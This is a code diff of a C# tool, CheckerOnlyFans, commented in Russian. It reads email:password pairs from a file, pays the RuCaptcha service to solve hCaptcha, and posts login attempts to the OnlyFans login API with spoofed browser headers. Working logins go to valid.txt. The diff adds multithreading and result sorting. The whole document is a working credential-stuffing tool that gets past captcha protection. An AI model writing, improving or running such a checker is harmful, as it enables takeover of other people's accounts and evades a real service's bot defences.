@@ -21,20 +21,28 @@ enum CheckResult
     WrongCaptcha,
     NeedRefreshPage,
     Error,
-    InknowError
+    UnknowError
 }
 
 namespace CheckerOnlyFans
 {
-    class Checker
+    partial class Checker
     {
+        #region Приватные поля
         private readonly string apiKey;
         private readonly RuCaptcha solver;
+        #endregion
+
+        #region Конструкторы
         public Checker(string apiKey)
         {
             this.apiKey = apiKey;
             solver = new RuCaptcha(apiKey);
         }
+        #endregion
+
+
+        #region Вспомогательные методы
         private static string base64Encode(string text)
         {
             var textBytes = Encoding.UTF8.GetBytes(text);
@@ -44,7 +52,10 @@ namespace CheckerOnlyFans
         {
             return DateTimeOffset.Now.ToUnixTimeSeconds() * 1000 - 10000;
         }
+        #endregion
 
+
+        #region Получение ответа на капчи
         public async Task<string> GetInvisibleCaptcha()
         {
 
@@ -59,7 +70,7 @@ namespace CheckerOnlyFans
             }
             catch (Exception e)
             {
-                Console.WriteLine("Error occurred: " + e.Message);
+                Console.WriteLine("Ошибка получения ответа на невидимой капчи: " + e.Message);
                 return null;
             }
         }
@@ -77,31 +88,53 @@ namespace CheckerOnlyFans
             }
             catch (Exception e)
             {
-                Console.WriteLine("Error occurred: " + e.Message);
+                Console.WriteLine("Ошибка получения ответа на капчу: " + e.Message);
                 return null;
             }
         }
+        #endregion
 
-        public async Task<string> Check(string email, string password)
+
+        /// <summary>
+        /// Проверка аккаунта на валидность
+        /// </summary>
+        /// <param name="email">Email</param>
+        /// <param name="password">Пароль</param>
+        /// <returns></returns>
+        /// <exception cref="ArgumentException">Email или пароль пуст</exception>
+        /// <exception cref="Exception">Не удалось решить капчу</exception>
+        public async Task<CheckResult> Check(string email, string password)
         {
+            #region Проверка аргументов на корректность
             if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(password))
             {
                 throw new ArgumentException("Email или пароль пуст");
             }
+            #endregion
+
+            #region Запрос ответа на капчу
             Console.WriteLine($"Запущен чек аккаунта {email}:{password}");
             string hCaptchaPassiveResponse = await GetInvisibleCaptcha();
             string hCaptchaResponse = await GetCaptcha();
-            //string hCaptchaPassiveResponse = "qwe";
-            //string hCaptchaResponse = "asd";
+            #endregion
 
+
+            #region Выброс ошибки, если капчу решить не удалось
             if (hCaptchaPassiveResponse == null || hCaptchaResponse == null)
             {
                 throw new Exception("Не удалось решить капчу");
             }
-            string encodedPassoword = base64Encode(password);
+            #endregion
 
+
+            string encodedPassoword = base64Encode(password);//Шифроание пароля
+
+
+            #region Попытка входа
             var client = new RestClient();
             var request = new RestRequest("https://onlyfans.com/api2/v2/users/login", Method.Post);
+
+            #region Хедеры запроса
             request.AddHeader("authority", "onlyfans.com");
             request.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
             request.AddHeader("time", "1648337832999");
@@ -119,15 +152,29 @@ namespace CheckerOnlyFans
             request.AddHeader("sec-fetch-dest", "empty");
             request.AddHeader("referer", "https://onlyfans.com/");
             request.AddHeader("accept-language", "ru-RU,ru;q=0.9");
-            //request.AddHeader("cookie", "sess=n9ltl1qu1gsnfsn9oqk8d4htvi; csrf=02x2EfwJb8b5e6c211eaef609cae0749d3f64b8d; ref_src=; fp=cd96e74d6c65fd02936a07eaf5268f23; sess=n9ltl1qu1gsnfsn9oqk8d4htvi");
-            //var body = @"{""email"":"""",""password"":""qweqwe"",""h-captcha-passive-response"":"""",""h-captcha-response"":"""",""encodedPassword"":""""}";
+            #endregion
 
-            string body = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\",\"h-captcha-passive-response\":\"" + hCaptchaPassiveResponse + "\",\"h-captcha-response\":\"" + hCaptchaResponse + "\",\"encodedPassword\":\"" + encodedPassoword + "\"}";
-            //request.AddParameter("application/json", body, ParameterType.RequestBody);
+            #region Тело запроса
+            string body = "{\"email\":\"" + email +
+        "\",\"password\":\"" + password +
+        "\",\"h-captcha-passive-response\":\"" + hCaptchaPassiveResponse +
+        "\",\"h-captcha-response\":\"" + hCaptchaResponse +
+        "\",\"encodedPassword\":\"" + encodedPassoword + "\"}";
+
             request.AddBody(body, "application/json");
+            #endregion
+
+            #region Получение ответа
             var response = await client.ExecuteAsync(request);
             string jsonText = response.Content;
+            #endregion
+
             JObject json = JObject.Parse(jsonText);
+            #endregion
+
+
+
+            #region Если ошибка
             if (json.TryGetValue("error", out JToken error))
             {
                 if (JObject.Parse(error.ToString()).TryGetValue("message", out JToken message))
@@ -136,46 +183,37 @@ namespace CheckerOnlyFans
                     switch (messageText)
                     {
                         case "Wrong email or password":
-                            return "Неправильный email или пароль";
+                            return CheckResult.Invalid;
                         case "Please refresh the page":
-                            return "Обновите страницу";
+                            return CheckResult.NeedRefreshPage;
                         case "Email is not valid":
-                            return "Невалидный email";
+                            return CheckResult.InvalidEmail;
                         default:
-                            return messageText;
+                            return CheckResult.Error;
                     }
-                    //if ((errorToken as JObject).TryGetValue("message", out JToken messageToken))
-                    //{
-                    //    string message = messageToken.ToString();
-                    //    switch (message)
-                    //    {
-                    //        case "Captcha wrong":
-                    //            return "Неверная капча";
-                    //        default:
-                    //            return message;
-                    //    }
-                    //}
-                    //else
-                    //{
-                    //    return jsonText;
-                    //}
                 }
                 else
                 {
-                    return jsonText;
+                    return CheckResult.UnknowError;
                 }
             }
+            #endregion
+            #region Если вернулся ID пользователя
             else if (json.TryGetValue("userId", out JToken userId))
             {
                 response = await GetMe(client);
-                return userId.ToString();
+                return CheckResult.Valid;
             }
+            #endregion
+            #region Если неизвестный результат
             else
             {
-                return jsonText;
+                return CheckResult.UnknowError;
             }
+            #endregion
         }
 
+        #region Нерабочий метод получения информации об аккаунте
         private async Task<RestResponse> GetMe(RestClient client)
         {
             var request = new RestRequest("https://onlyfans.com/api2/v2/users/me", Method.Get);
@@ -204,173 +242,97 @@ namespace CheckerOnlyFans
             request.AddHeader("cookie", cookies);
 
             var response = await client.ExecuteAsync(request);
-            Console.WriteLine(response.Content);
             return response;
         }
+        #endregion
 
 
-        class Config
+    }
+
+    internal class Program
+    {
+        
+        static void Main(string[] args)
         {
-            string configName;
-
-            public string ApiKey { get;}
-
-            public static string ReadApiToken()
+            int threadCount = 1;
+            do
             {
-                string apiToken = null;
-                do
-                {
-                    Console.WriteLine("API ключ rucaptcha:");
-                    apiToken = Console.ReadLine();
-                    Console.Clear();
+                Console.Clear();
+                Console.WriteLine("Количество потоков(1-3):");
 
-                } while (apiToken.Length != 32 || string.IsNullOrEmpty(apiToken));
-                return apiToken;
-            }
-            public Config(string configPath)
-            {
-                configName = configPath;
-                ApiKey = LoadApiKey();
-            }
-            public Config():this("config.json") { }
+            } while(!int.TryParse(Console.ReadLine(), out threadCount) || threadCount < 1 || threadCount > 3);
+            
 
-            private string LoadApiKey()
-            {
-
-                string apiKey;
-                if (File.Exists(configName))
-                {
-                    var json = JObject.Parse(File.ReadAllText(configName));
-                    if (json.TryGetValue("rucaptchaApiKey", out var apiKeyToken))
-                    {
-                        if (apiKeyToken.ToString().Length == 32)
-                        {
-                            apiKey = apiKeyToken.ToString();
-                        }
-                        else
-                        {
-                            Console.WriteLine("Длина токена должна быть 32 символа");
-                            apiKey = ReadApiToken();
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("Не удалось получить API ключ из конфига");
-                        File.Delete(configName);
-                        apiKey = apiKey = ReadApiToken();
-                        File.WriteAllText(configName, JsonConvert.SerializeObject(new { rucaptchaApiKey = apiKey }));
-                    }
-
-                }
-                else
-                {
-                    apiKey = apiKey = ReadApiToken();
-                    File.WriteAllText(configName, JsonConvert.SerializeObject(new { rucaptchaApiKey = apiKey }));
-                    //string apiKey = JObject.Parse(File.ReadAllText("qwe.txt"))["rucaptchaApiKey"].ToString();
-                }
-                return apiKey;
-            }
+            Run(threadCount);
         }
 
-
-        internal class Program
+        private static void Run(int threadCount)
         {
-            static void Main(string[] args)
+            Semaphore sem = new Semaphore(threadCount, threadCount);
+            Config config = new Config();
+
+            Checker checker = new Checker(config.ApiKey);
+            List<(string, string)> data = new List<(string, string)>();
+            List<(string, CheckResult)> accounts = new List<(string, CheckResult)>();
+
+            if (File.Exists("unchecked.txt"))
             {
-
-                Config config = new Config();
-
-                Checker checker = new Checker(config.ApiKey);
-                List<(string, string)> data = new List<(string, string)>();
-
-                if (File.Exists("unchecked.txt"))
+                foreach (var line in File.ReadAllLines("unchecked.txt"))
                 {
-                    foreach (var line in File.ReadAllLines("unchecked.txt"))
+                    if (line.Contains(':'))
                     {
-                        if (line.Contains(':'))
-                        {
-                            var acc = line.Split(':');
-                            data.Add((acc.FirstOrDefault(), acc.LastOrDefault()));
-                        }
+                        var acc = line.Split(':');
+                        data.Add((acc.FirstOrDefault(), acc.LastOrDefault()));
                     }
-                    Console.WriteLine($"Загружено валидных строк: {data.Count}");
                 }
-                else
-                {
-                    Console.WriteLine("Файл unchecked.txt не найден.");
-                }
-
-                List<Task<string>> tasks = new List<Task<string>>();
-
-                foreach (var item in data)
-                {
-                    Console.WriteLine($"В очередь добален: {item.Item1}:{item.Item2}");
-                    Task<string> temp = Task.Run(async () =>
-                    {
-
-                        sem.WaitOne();
-                        var result = await checker.Check(item.Item1, item.Item2);
-                        sem.Release();
-                        return result;
-
-                    });
-                    tasks.Add(temp);
-                }
-
-
-                Task.WaitAll(tasks.ToArray());
-
-                File.WriteAllText("qwe.txt", JsonConvert.SerializeObject(new { rucaptchaApiKey = "qwe" }));
-
+                Console.WriteLine($"Загружено валидных строк: {data.Count}");
+            }
+            else
+            {
+                Console.WriteLine("Файл unchecked.txt не найден.");
             }
 
-            static Semaphore sem = new Semaphore(3, 3);
+            List<Task> tasks = new List<Task>();
 
-            public static async Task Run()
+            foreach (var item in data)
             {
-                TaskFactory taskFactory = new TaskFactory();
-                Task task1 = SomeFunc("task1");
-                Task task2 = SomeFunc("task2");
-                Task task3 = SomeFunc("task3");
-                Task task4 = SomeFunc("task4");
-                Task task5 = SomeFunc("task5");
-                Task task6 = SomeFunc("task6");
-                Task task7 = SomeFunc("task7");
+                Task temp = Task.Run(async () =>
+                {
 
-                //List<Task> tasks = new List<Task>() { task1, task2, task3, task4, task5, task6, task7 };
-                List<Task> tasks = new List<Task>();
-                for (int i = 0; i < 10000; i++)
-                {
-                    tasks.Add(SomeFunc($"test{i}"));
-                }
-                TaskFactory taskFactory1 = new TaskFactory();
-                await taskFactory1.StartNew(() => Console.WriteLine("qwe"));
-                Console.WriteLine(taskFactory1.Scheduler.MaximumConcurrencyLevel);
-                
-            }
-            public static Random random = new Random();
-            public static async Task<string> SomeFunc(string name)
-            {
-                await Task.Run(() =>
-                {
-                    int count = random.Next(1, 100000);
-                    for (int i = 0; i < count; i++)
+                    sem.WaitOne();
+                    var result = await checker.Check(item.Item1, item.Item2);
+
+                    switch (result)
                     {
-                        var foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        foo = Math.Sqrt(Math.Pow(i, 0.2));
-                        //Console.WriteLine($"{name} [{i}|{count}]");
+                        case CheckResult.Valid:
+                            Console.WriteLine($"{item.Item1}:{item.Item2} Валид");
+                            using (StreamWriter writer = new StreamWriter("valid.txt", true))
+                            {
+                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}");
+                            }
+                            break;
+                        case CheckResult.Invalid:
+                            Console.WriteLine($"{item.Item1}:{item.Item2} Невалид");
+                            using (StreamWriter writer = new StreamWriter("invalid.txt", true))
+                            {
+                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}");
+                            }
+                            break;
+                        default:
+                            Console.WriteLine($"{item.Item1}:{item.Item2} Ошибка");
+                            using (StreamWriter writer = new StreamWriter("error.txt", true))
+                            {
+                                await writer.WriteLineAsync($"{item.Item1}:{item.Item2}:{result}");
+                            }
+                            break;
                     }
+
+                    sem.Release();
+
                 });
-                //Console.WriteLine(name);
-                return name;
+                tasks.Add(temp);
             }
-
-
+            Task.WaitAll(tasks.ToArray());
         }
     }
 }
